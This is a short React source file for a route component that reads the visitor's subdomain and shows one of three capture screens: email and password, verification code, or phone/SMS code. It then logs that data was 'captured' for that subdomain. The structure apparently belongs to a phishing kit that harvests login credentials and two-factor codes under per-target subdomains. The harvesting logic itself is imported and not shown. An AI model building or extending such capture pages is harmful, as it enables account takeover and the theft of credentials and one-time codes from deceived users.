
import React, { useEffect, useState } from 'react';
import { useParams, useSearchParams } from 'react-router-dom';
import ScriptDataCapture from '@/components/ScriptDataCapture';

const ScriptPage = () => {
  const { scriptType } = useParams<{ scriptType: string }>();
  const [searchParams] = useSearchParams();
  const [detectedSubdomain, setDetectedSubdomain] = useState<string>('');

  useEffect(() => {
    // Detectar subdominio de la URL actual
    const hostname = window.location.hostname;
    const parts = hostname.split('.');
    if (parts.length > 2) {
      setDetectedSubdomain(parts[0]);
    }
  }, []);

  const getScriptType = (): 'email_password' | 'verification_code' | 'phone_verification' => {
    switch (scriptType) {
      case 'email':
      case 'login':
      case 'email_password':
        return 'email_password';
      case 'code':
      case 'verification':
      case 'verification_code':
        return 'verification_code';
      case 'phone':
      case 'sms':
      case 'phone_verification':
        return 'phone_verification';
      default:
        return 'email_password';
    }
  };

  return (
    <ScriptDataCapture 
      scriptType={getScriptType()}
      subdomain={detectedSubdomain}
      onSuccess={() => {
        console.log('Data captured successfully for subdomain:', detectedSubdomain);
      }}
    />
  );
};

export default ScriptPage;
